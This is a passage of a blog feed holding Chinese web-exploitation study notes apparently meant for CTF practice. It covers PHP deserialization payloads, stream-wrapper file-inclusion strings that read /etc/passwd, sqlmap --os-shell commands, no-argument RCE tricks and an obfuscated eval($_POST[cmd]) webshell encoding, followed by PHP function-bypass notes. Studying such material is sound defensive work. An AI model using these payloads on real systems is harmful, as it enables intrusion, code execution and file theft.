class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs ini\"><span class=\"hljs-attr\">local-infile</span>=<span class=\"hljs-number\">1</span><br><span class=\"hljs-attr\">secure_file_priv</span>=<span class=\"hljs-string\">\"\"</span><br></code></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight pgsql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"><span class=\"hljs-keyword\">LOAD</span> DATA <span class=\"hljs-keyword\">LOCAL</span> INFILE <span class=\"hljs-string\">'phar://phar.phar/test.txt'</span> <span class=\"hljs-keyword\">into</span> <span class=\"hljs-keyword\">table</span> <span class=\"hljs-keyword\">user</span>;<br></code></pre></td></tr></tbody></table></figure>\n\n<p><a href=\"https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/\">https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">?data=O:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">\"HelloPhp\"</span>:<span class=\"hljs-number\">2</span>:{s:<span class=\"hljs-number\">1</span>:<span class=\"hljs-string\">\"a\"</span>;s:<span class=\"hljs-number\">9</span>:<span class=\"hljs-string\">\"phpinfo()\"</span>;s:<span class=\"hljs-number\">1</span>:<span class=\"hljs-string\">\"b\"</span>;s:<span class=\"hljs-number\">6</span>:<span class=\"hljs-string\">\"assert\"</span>;}<br>?data=O:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">\"HelloPhp\"</span>:<span class=\"hljs-number\">2</span>:{s:<span class=\"hljs-number\">1</span>:<span class=\"hljs-string\">\"a\"</span>;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">\"phpinfo()\"</span>;s:<span class=\"hljs-number\">1</span>:<span class=\"hljs-string\">\"b\"</span>;s:<span class=\"hljs-number\">6</span>:<span class=\"hljs-string\">\"assert\"</span>;}<br>?data=O:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">\"HelloPhp\"</span>:<span class=\"hljs-number\">2</span>:{s:<span class=\"hljs-number\">1</span>:<span class=\"hljs-string\">\"a\"</span>;s:<span class=\"hljs-number\">9</span>:<span class=\"hljs-string\">\"phpinfo()\"</span>;s:<span class=\"hljs-number\">1</span>:<span class=\"hljs-string\">\"b\"</span>;s:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"eval\"</span>;}<br></code></pre></td></tr></tbody></table></figure>\n\n<p><a href=\"https://xz.aliyun.com/t/7570\">https://xz.aliyun.com/t/7570</a></p>\n<ol>\n<li>原理：某些对象在序列化后会因为用户的输入而产生影响，即黑客的数据会被插入到黑客的字节数据中导致该字节序列在服务器端进行反序列化后的对象发生变化。<ol>\n<li>魔术方法：<ol>\n<li>构造函数__construct()：当创建对象时会自动进行调用</li>\n<li>析构函数__deconstruct()：当对象被销毁时会自动调用</li>\n<li>__wakeup()：当调用unserialize()函数时会自动调用</li>\n</ol>\n</li>\n</ol>\n</li>\n<li>触发函数：serialize和unserialize函数进行触发</li>\n<li>防御方式：不要将用户的输入或者用户可控的参数直接插入到反序列化操作中去，采用白名单限制</li>\n</ol>\n<h2 id=\"JAVA中的反序列化\"><a href=\"#JAVA中的反序列化\" class=\"headerlink\" title=\"JAVA中的反序列化\"></a>JAVA中的反序列化</h2><hr>\n<p>下面不属于OWASP top 10中的内容，但为方便查询也在此记录。</p>\n<h1 id=\"PHP伪协议\"><a href=\"#PHP伪协议\" class=\"headerlink\" title=\"PHP伪协议\"></a>PHP伪协议</h1><h2 id=\"一、漏洞依附\"><a href=\"#一、漏洞依附\" class=\"headerlink\" title=\"一、漏洞依附\"></a>一、漏洞依附</h2><p>\\1. allow_url_fopen()打开文件-&gt;通常设置为On，使得可以访问 URL 对象文件等。</p>\n<p>\\2. allow_url_include()引用文件-&gt;通常设置为off，包含URL 对象文件等</p>\n<p>均可在配置文件，php.ini中查看（通常位置：/usr/local/php/lib）</p>\n<h2 id=\"二、常见协议\"><a href=\"#二、常见协议\" class=\"headerlink\" title=\"二、常见协议\"></a>二、常见协议</h2><h3 id=\"1-data\"><a href=\"#1-data\" class=\"headerlink\" title=\"1. data:\"></a>1. data:</h3><p>访问本地文件系统 </p>\n<p>实例：<strong>1.?file=data:text/plain,  #GET数据</strong></p>\n<p>此时对输入执行file_get_contents</p>\n<p>data://text/plain,I%20have%20a%20dream  # z直接读取plain后的内容</p>\n<p><strong>2.?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=  #后面的base64字符是需要传入的字符串的base64编码</strong></p>\n<h3 id=\"2-phar\"><a href=\"#2-phar\" class=\"headerlink\" title=\"2. phar:\"></a>2. phar:</h3><p>可以查找指定压缩包内的文件，说通俗点就是php解压缩包的一个函数，解压的压缩包与后缀无关。</p>\n<p>实例：**filename=**<strong>phar://test.[zip/jpg/png…]/file.txt</strong>  phar://test.rar/1.txt</p>\n<p>可以将任意后缀名的文件(必须要有后缀名)，只要是zip格式压缩的，都可以进行解压，因此上面可以改为<strong>phar://test.test/file.txt</strong>也可以运行。</p>\n<h3 id=\"3-temp\"><a href=\"#3-temp\" class=\"headerlink\" title=\"3. temp:\"></a>3. temp:</h3><p>一个类似文件 包装器的数据流，允许读写临时数据.会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。</p>\n<h3 id=\"4-php-x2F-x2F-filter\"><a href=\"#4-php-x2F-x2F-filter\" class=\"headerlink\" title=\"4. php://filter:\"></a>4. php://filter:</h3><p>(1) 一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以使用.  php://filter/read=string.rot13/resource=123.txt</p>\n<p>php://filter/convert.base64-decode/resource</p>\n<p>(2) 参数设置：read用于include()和file_get_contents(),write用于file_put_contents()中。</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041432582.png\" alt=\"image-20200630094832964\"></p>\n<p><strong>①实例用法：</strong> <strong>php://filter/[read/write]=string.[rot13/strip_tags/…..]/resource=xxx</strong></p>\n<p><strong>②</strong> <strong>php://filter/convert.base64-[encode/decode]/resource=xxx</strong></p>\n<figure class=\"highlight awk\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">php:<span class=\"hljs-regexp\">//</span>filter<span class=\"hljs-regexp\">/read=convert.base64-encode/</span>resource=index.php<br></code></pre></td></tr></tbody></table></figure>\n\n<p>这是使用的过滤器是convert.base64-encode.它的作用就是读取upload.php的内容进行base64编码后输出。可以用于读取程序源代码经过base64编码后的数据</p>\n<p>例题：BSidesCF 2020]Had a bad day</p>\n<h3 id=\"5-php-x2F-x2F-input\"><a href=\"#5-php-x2F-x2F-input\" class=\"headerlink\" title=\"5. php://input:\"></a>5. php://input:</h3><p>可以访问请求的原始数据的只读流，<strong>将post请求的数据当作php代码执行</strong>。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。enctype=”multipart/form-data时，php://input是无效的。</p>\n<p>实例：**file=**<strong>php://input   hackbarPost数据</strong></p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041432587.png\" alt=\"image-20200630094919052\"></p>\n<h3 id=\"6-memory\"><a href=\"#6-memory\" class=\"headerlink\" title=\"6. memory:\"></a>6. memory:</h3><p>是一个类似文件 包装器的数据流，允许读写临时数据，总是把数据储存在内存中</p>\n<p>\\7. file:f在双OFF的时候也可以用，用于本地文件包含注：file://协议必须是绝对路径</p>\n<p>实例：file:// [文件的绝对路径和文件名]</p>\n<p><strong>Linux：</strong><a href=\"http://127.0.0.1/FI/LFI.php?file=file:///etc/passwd\"><strong>http://127.0.0.1/FI/LFI.php?file=file:///etc/passwd</strong></a></p>\n<p><strong>Windows：<a href=\"http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt\">http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt</a></strong></p>\n<h3 id=\"8-zip\"><a href=\"#8-zip\" class=\"headerlink\" title=\"8.zip:\"></a>8.zip:</h3><p>压缩流。</p>\n<h3 id=\"9-Expect\"><a href=\"#9-Expect\" class=\"headerlink\" title=\"9.Expect:\"></a>9.Expect:</h3><p>处理交互式的流</p>\n<p>总的来说就是：</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041432590.png\" alt=\"image-20200630094950772\"></p>\n<p>gopher协议配合ssrf利用</p>\n<h2 id=\"三，常见漏洞函数\"><a href=\"#三，常见漏洞函数\" class=\"headerlink\" title=\"三，常见漏洞函数\"></a>三，常见漏洞函数</h2><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">include</span>、<br><span class=\"hljs-keyword\">require</span>、<br><span class=\"hljs-keyword\">include_once</span>、<br><span class=\"hljs-keyword\">require_once</span>、<br>highlight_file 、<br>show_source 、<br>readfile 、<br>file_get_contents 、<br>fopen 、<br>file<br></code></pre></td></tr></tbody></table></figure>\n\n<p>敏感目录：file=/etc/apache2/apache2.conf</p>\n<h2 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h2><p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429150.png\" alt=\"image-20221030144318465\"></p>\n<ul>\n<li><p>File=php://filter:[payload]</p>\n<ul>\n<li>概念：源封装器，用于数据流打开时的筛选过滤应用。</li>\n<li>配合函数：readfile，file，file_get_contents进行读取</li>\n<li>payload：file=php://filter/read=convert.base64-encode/resource=flag.php</li>\n<li>可选择各种编码获取读出的内容：</li>\n<li>注意：在file_put_content函数中第一个参数时输出内容的文件名，也可以使用伪协议将任何输入该文件的内容都进行解码或编码</li>\n</ul>\n</li>\n<li><p>File=php://input;</p>\n<ul>\n<li><p>要求allow_url_include必须是on的情况，此时直接post任何内容都会被当作php代码执行</p>\n</li>\n<li><p>Include 函数的参数可以是file协议，能够通过该方式读取文件绝对路径，将内容视为php代码执行</p>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"SQLMAP玩法\"><a href=\"#SQLMAP玩法\" class=\"headerlink\" title=\"SQLMAP玩法\"></a>SQLMAP玩法</h1><p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429887.png\" alt=\"image-20221030144328542\"></p>\n<p>SQLmap玩法：</p>\n<ul>\n<li><p>sqlmap -u “<a href=\"http://192.168.234.1/sqli-labs-master/Less-1/?id=5\">http://192.168.234.1/sqli-labs-master/Less-1/?id=5</a>“ –tables 查询表名</p>\n</li>\n<li><p>sqlmap -u “<a href=\"http://192.168.234.1/sqli-labs-master/Less-1/?id=5\">http://192.168.234.1/sqli-labs-master/Less-1/?id=5</a>“ –db 用于查询当前的数据库</p>\n</li>\n<li><p>sqlmap -u “<a href=\"http://192.168.234.1/sqli-labs-master/Less-1/?id=5\">http://192.168.234.1/sqli-labs-master/Less-1/?id=5</a>“ –os-shell 获取目标主机的shell</p>\n</li>\n<li><p>sqlmap -u “<a href=\"http://192.168.234.1/sqli-labs-master/Less-1/?id=5\">http://192.168.234.1/sqli-labs-master/Less-1/?id=5</a>“ -D “security” –tables</p>\n</li>\n<li><p>-samrt 用于智能测试目标主机的情况.</p>\n</li>\n<li><p>其中的dump是用于读出来全部的数据</p>\n</li>\n</ul>\n<p>判断数据库类型：</p>\n<ul>\n<li>常见规律：</li>\n</ul>\n<p>php : Mysql</p>\n<p>jsp : Oracle</p>\n<p>挖过哪些漏洞？</p>\n<ul>\n<li>越权，弱口令，xss</li>\n</ul>\n<p>修复文件包含？</p>\n<ul>\n<li>使用open_basedir()配置限制访问在指定的区域</li>\n<li>过滤特殊字符，尽量关闭allow_url_include</li>\n</ul>\n<h1 id=\"命令注入\"><a href=\"#命令注入\" class=\"headerlink\" title=\"命令注入\"></a>命令注入</h1><h3 id=\"无参数RCE\"><a href=\"#无参数RCE\" class=\"headerlink\" title=\"无参数RCE\"></a>无参数RCE</h3><p>[<a href=\"https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE]\">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE]</a>(<a href=\"https://skysec.top/2019/03/2\">https://skysec.top/2019/03/2</a>\t9/PHP-Parametric-Function-RCE/#什么是无参数函数RCE)</p>\n<h3 id=\"current-localeconv\"><a href=\"#current-localeconv\" class=\"headerlink\" title=\"current(localeconv())\"></a>current(localeconv())</h3><hr>\n<p>该函数得到的内容永远是点</p>\n<figure class=\"highlight lisp\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs lisp\">scandir(<span class=\"hljs-name\">current</span>(<span class=\"hljs-name\">localeconv</span>()))<span class=\"hljs-comment\">; </span><br>print_r(<span class=\"hljs-name\">scandir</span>(<span class=\"hljs-name\">pos</span>(<span class=\"hljs-name\">localeconv</span>())))<span class=\"hljs-comment\">; #  即这两个表达式会返回当前的目录内容</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"常见命令注入操作函数\"><a href=\"#常见命令注入操作函数\" class=\"headerlink\" title=\"常见命令注入操作函数\"></a>常见命令注入操作函数</h3><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-title function_ invoke__\">file_get_contents</span>(),<span class=\"hljs-title function_ invoke__\">readfile</span>(),<span class=\"hljs-title function_ invoke__\">highlight_file</span>() <span class=\"hljs-comment\"># 读取文件内容</span><br><span class=\"hljs-title function_ invoke__\">getcwd</span>() <span class=\"hljs-comment\"># 用于获取当前目录</span><br><span class=\"hljs-title function_ invoke__\">scandir</span>(<span class=\"hljs-title function_ invoke__\">getcwd</span>()) <span class=\"hljs-comment\"># 配合scandir即可得到当前的目录</span><br><span class=\"hljs-title function_ invoke__\">dirname</span>() <span class=\"hljs-comment\"># 用于返回当前所在的文件夹</span><br><span class=\"hljs-title function_ invoke__\">chdir</span>(<span class=\"hljs-title function_ invoke__\">dirname</span>(<span class=\"hljs-title function_ invoke__\">getcwd</span>()))  <span class=\"hljs-comment\"># 即可切换到上一个文件夹目录</span><br><span class=\"hljs-title function_ invoke__\">array_flip</span>() <span class=\"hljs-comment\"># 对数组中的值和键进行翻转</span><br><span class=\"hljs-title function_ invoke__\">array_reverse</span>() <span class=\"hljs-comment\"># 将数组中的元素顺序进行翻转</span><br><span class=\"hljs-title function_ invoke__\">prev</span>() - 将内部指针指向数组中的上一个元素，并输出<br><span class=\"hljs-title function_ invoke__\">current</span>() - 返回数组中的当前元素的值<br><span class=\"hljs-title function_ invoke__\">next</span>() - 返回数组中的下一个元素<br><span class=\"hljs-title function_ invoke__\">end</span>() - 将内部指针指向数组中的最后一个元素，并输出<br><span class=\"hljs-title function_ invoke__\">reset</span>() - 将内部指针指向数组中的第一个元素，并输出<br><span class=\"hljs-title function_ invoke__\">each</span>() - 返回当前元素的键名和键值，并将内部指针向前移动<br>apache2 专属函数 <span class=\"hljs-title function_ invoke__\">getallheaders</span>() <span class=\"hljs-comment\"># 获取http请求头的内容并返回一个数组</span><br><span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-title function_ invoke__\">hex2bin</span>(<span class=\"hljs-title function_ invoke__\">session_id</span>(<span class=\"hljs-title function_ invoke__\">session_start</span>()))) <span class=\"hljs-comment\"># 执行Cookie中传入的PHPSESSID 的值，但需要进行十六进制编码</span><br>    <br>{}可以用来代替[]<br><span class=\"hljs-title function_ invoke__\">base_convert</span>(<span class=\"hljs-number\">37907361743</span>,<span class=\"hljs-number\">10</span>,<span class=\"hljs-number\">36</span>)  <span class=\"hljs-comment\"># 将第一个字符串从 十进制转换为36进制，此处的转换结果为hex2bin</span><br><span class=\"hljs-title function_ invoke__\">hex2bin</span>() <span class=\"hljs-comment\"># 将16进制转换为字符串</span><br><span class=\"hljs-title function_ invoke__\">dechex</span>() <span class=\"hljs-comment\"># 将其中的函数转换为16进制，转换的时候是直接转换 0x5f474554  - &gt; int(0x5f474554) 1598506324</span><br><span class=\"hljs-title function_ invoke__\">base_convert</span>(<span class=\"hljs-number\">37907361743</span>,<span class=\"hljs-number\">10</span>,<span class=\"hljs-number\">36</span>)(<span class=\"hljs-title function_ invoke__\">dechex</span>(<span class=\"hljs-number\">1598506324</span>));<span class=\"hljs-variable\">$$pi</span>{abs}(<span class=\"hljs-variable\">$$pi</span>{asin}) <span class=\"hljs-comment\"># $_GET[abs]($_GET[asin]) 即可进行任意命令执行</span><br><br><br><span class=\"hljs-title function_ invoke__\">getallheaders</span>() <span class=\"hljs-comment\"># 获取消息头部   getallheaders(){1} 即可获得键为1的消息头部值，此时在消息头部写上1:cat /flag即可得到字符串</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<p>($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat+/flag  77763910388090860000</p>\n<h3 id=\"编码注入\"><a href=\"#编码注入\" class=\"headerlink\" title=\"编码注入\"></a>编码注入</h3><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>a=′assert′;<span class=\"hljs-title function_ invoke__\">echourlencode</span>( a).<span class=\"hljs-string\">\"\\n\"</span>;<br>b=′(<span class=\"hljs-keyword\">eval</span>(_POST[cmd]))<span class=\"hljs-string\">';</span><br><span class=\"hljs-string\">echo urlencode(~$b).\"\\n\";</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\"># 生成字符串(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6);</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"对于字符的绕过\"><a href=\"#对于字符的绕过\" class=\"headerlink\" title=\"对于字符的绕过\"></a>对于字符的绕过</h2><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br> <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">ip2long</span>(<span class=\"hljs-string\">'47.100.33.58'</span>)<br> <span class=\"hljs-meta\">?&gt;</span><br> <span class=\"hljs-comment\"># 使用以上代码得到的内容依然可以访问</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"PHP执行绕过\"><a href=\"#PHP执行绕过\" class=\"headerlink\" title=\"PHP执行绕过\"></a>PHP执行绕过</h2><figure class=\"highlight x86asm\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs x86asm\">tar cvf <span class=\"hljs-keyword\">test</span> <span class=\"hljs-number\">1.</span>php 将<span class=\"hljs-number\">1.</span>php打包为<span class=\"hljs-keyword\">test</span>，使用PHP执行<span class=\"hljs-keyword\">test</span>即可运行其中的代码<br><br>tar cvf <span class=\"hljs-number\">aech</span> /目录  将其打包但是不压缩，其中的代码依然会明文保存，使用php <span class=\"hljs-number\">aech</span>依然会执行<br></code></pre></td></tr></tbody></table></figure>\n\n",
            "tags": [
                "web",
                "exploit"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2024/03/04/php-lou-dong-han-shu/",
            "url": "https://alazymechnaic.github.io/2024/03/04/php-lou-dong-han-shu/",
            "title": "PHP漏洞函数",
            "date_published": "2024-03-04T06:32:51.000Z",
            "content_html": "<h2 id=\"is-numeric\"><a href=\"#is-numeric\" class=\"headerlink\" title=\"is_numeric()\"></a>is_numeric()</h2><hr>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\"># 将数字判断为非数字</span><br><span class=\"hljs-number\">123</span>%<span class=\"hljs-number\">00</span>，或者 <span class=\"hljs-number\">123</span>%<span class=\"hljs-number\">20</span>  其中的%<span class=\"hljs-number\">20</span>只能放在最后，否则%<span class=\"hljs-number\">20</span>后面的部分会被继续做判断<br><span class=\"hljs-comment\"># 将非数字转化为数字</span><br>使用十六进制<span class=\"hljs-number\">0x123456</span><br></code></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"strcmp\"><a href=\"#strcmp\" class=\"headerlink\" title=\"strcmp()\"></a>strcmp()</h2><hr>\n<figure class=\"highlight stylus\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\">当传入的变量为数组时可以得到<br><span class=\"hljs-function\"><span class=\"hljs-title\">strcmp</span><span class=\"hljs-params\">(password[],<span class=\"hljs-string\">'xxxxxx'</span>)</span></span>==<span class=\"hljs-number\">1</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"addslashes\"><a href=\"#addslashes\" class=\"headerlink\" title=\"addslashes()\"></a>addslashes()</h2><figure class=\"highlight ada\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs ada\">转译单引号<br>'   <span class=\"hljs-comment\">---&gt;   \\'</span><br>\\   <span class=\"hljs-comment\">---&gt;   \\\\</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"parse-url\"><a href=\"#parse-url\" class=\"headerlink\" title=\"parse_url\"></a>parse_url</h2><figure class=\"highlight ruby\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs ruby\">该函数将输入的字符串解析为协议，主机名等几部分<br>但当字符串以 /<span class=\"hljs-regexp\">//</span> 开头时，会返回<span class=\"hljs-literal\">false</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"file-get-contents\"><a href=\"#file-get-contents\" class=\"headerlink\" title=\"file_get_contents()\"></a>file_get_contents()</h2><hr>\n<figure class=\"highlight awk\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">file_get_contents(<span class=\"hljs-variable\">$text</span>,<span class=\"hljs-string\">'r'</span>)<br><span class=\"hljs-comment\"># 其中的$text可以传入php伪协议：data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=,从而读取到的就是传入的字符串了</span><br>file=php:<span class=\"hljs-regexp\">//</span>filter<span class=\"hljs-regexp\">/read=convert.base64-encode/</span>resource=useless.php<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"eregi\"><a href=\"#eregi\" class=\"headerlink\" title=\"eregi()\"></a>eregi()</h2><hr>\n<figure class=\"highlight arcade\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs arcade\">在一个字符串搜索指定的模式的字符串。搜索不区分大小写。可选的输入参数规则包含一个数组的所有匹配表达式,他们被正则表达式的括号分组。<br>eregi (<span class=\"hljs-string\">\"/\\w{8,10}/\"</span>, <span class=\"hljs-symbol\">$password</span>)  匹配成功返回<span class=\"hljs-literal\">TRUE</span>否则返回<span class=\"hljs-literal\">False</span><br><br>截断漏洞<br><span class=\"hljs-number\">1.</span>%<span class=\"hljs-number\">00</span>截断及遇到%<span class=\"hljs-number\">00</span>则默认为字符串的结束<br><span class=\"hljs-number\">2.</span>当传入的字符串为数组时，返回的值为<span class=\"hljs-literal\">TRUE</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n\n\n<h2 id=\"intval\"><a href=\"#intval\" class=\"headerlink\" title=\"intval\"></a>intval</h2><hr>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">Intval最大的值取决于操作系统。 <span class=\"hljs-number\">32</span> 位系统最大带符号的 <span class=\"hljs-keyword\">integer</span> 范围是 -<span class=\"hljs-number\">2147483648</span> 到 <span class=\"hljs-number\">2147483647</span>。<br><span class=\"hljs-comment\"># 举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</span><br><br>这个有个应用就是在判断数值是不是回文上，如果参数为<span class=\"hljs-number\">2147483647</span>，那么当它反过来，由于超出了限制，所以依然等于<span class=\"hljs-number\">2147483647</span>。即为回文。<br>    <br>    <br> 在处理数字时，若数字为科学计数法则输出前面的部分<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">intval</span>(<span class=\"hljs-string\">\"1e10\"</span>);<br><span class=\"hljs-comment\"># 1</span><br>但是在加上一个数字后则不同<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">intval</span>(<span class=\"hljs-string\">\"1e10\"</span>+<span class=\"hljs-number\">1</span>);<br><span class=\"hljs-comment\"># 10000000001</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"array-search\"><a href=\"#array-search\" class=\"headerlink\" title=\"array_search\"></a>array_search</h2><hr>\n<figure class=\"highlight abnf\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs abnf\">array_search会根据键名索引键值，若使用array_search(键名，目标)<span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span>false判断，当返回的键值的值为<span class=\"hljs-number\">0</span>时，<span class=\"hljs-number\">0</span><span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span>false为TRUE<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n\n\n<h2 id=\"弱类型\"><a href=\"#弱类型\" class=\"headerlink\" title=\"弱类型\"></a>弱类型</h2><hr>\n<h3 id=\"“-x3D-x3D-”和“-x3D-x3D-x3D-”\"><a href=\"#“-x3D-x3D-”和“-x3D-x3D-x3D-”\" class=\"headerlink\" title=\"“==”和“===”\"></a><strong>“==”和“===”</strong></h3><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\"># 